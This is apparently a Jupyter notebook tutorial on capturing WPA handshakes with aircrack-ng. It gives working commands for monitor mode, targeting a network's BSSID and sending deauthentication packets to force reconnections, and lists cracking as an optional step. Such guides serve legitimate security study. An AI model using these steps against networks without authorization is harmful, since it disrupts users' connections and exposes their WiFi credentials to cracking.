    "# Basic WiFi Penetration Testing Guide\n",
    "\n",
    "This notebook explains the basic process of capturing a WPA handshake using aircrack-ng tools. For educational purposes only.\n",
    "\n",
    "## Overview of the Process\n",
    "1. Enable monitor mode on wireless interface\n",
    "2. Scan for networks\n",
    "3. Capture WPA handshake\n",
    "4. (Optional) Attempt to crack the handshake\n",
    "\n",
    "## Key Commands\n",
    "\n",
    "### 1. Enable Monitor Mode\n",
    "```bash\n",
    "# Start monitor mode on wlan1\n",
    "sudo airmon-ng start wlan1\n",
    "\n",
    "# Check if monitor mode is enabled\n",
    "iwconfig wlan1mon\n",
    "```\n",
    "\n",
    "### 2. Scan for Networks\n",
    "```bash\n",
    "# Scan and save results to CSV\n",
    "sudo airodump-ng wlan1mon --write scan --write-interval 1 --output-format csv\n",
    "```\n",
    "This will show you available networks and their details:\n",
    "- BSSID (MAC address)\n",
    "- Channel\n",
    "- Encryption type\n",
    "- ESSID (network name)\n",
    "\n",
    "### 3. Target Specific Network\n",
    "Once you've identified your target network:\n",
    "```bash\n",
    "# Start capturing packets for specific network\n",
    "sudo airodump-ng --bssid <TARGET_BSSID> --channel <CHANNEL> --write capture wlan1mon\n",
    "```\n",
    "\n",
    "### 4. Deauth to Force Handshake\n",
    "In another terminal:\n",
    "```bash\n",
    "# Send deauth packets to force reconnection\n",
    "aireplay-ng --deauth 20 -a <TARGET_BSSID> wlan1mon\n",
    "```\n",
    "\n",
    "### 5. Verify Handshake\n",
    "```bash\n",
    "# Check if handshake was captured\n",
    "aircrack-ng capture-01.cap\n",
    "```\n",
    "\n",
    "## Important Notes\n",
    "1. Replace `wlan1` with your wireless interface name\n",
    "2. Monitor mode creates a new interface (usually with 'mon' suffix)\n",
    "3. Some processes might interfere with monitor mode:\n",
    "   ```bash\n",
    "   airmon-ng check kill\n",
    "   ```\n",
    "4. Always clean up when done:\n",
    "   ```bash\n",
    "   airmon-ng stop wlan1mon\n",
    "   ```\n",
    "\n",
    "## Common Issues\n",
    "1. Interface not supporting monitor mode\n",
    "2. NetworkManager/wpa_supplicant interference\n",
    "3. Missing handshake in capture\n",
    "4. Wrong channel number\n",
    "\n",
    "## Prerequisites\n",
    "- Wireless adapter supporting monitor mode\n",
    "- aircrack-ng suite installed\n",
    "- Root privileges\n",
    "```bash\n",
    "sudo apt-get install aircrack-ng\n",
    "```"
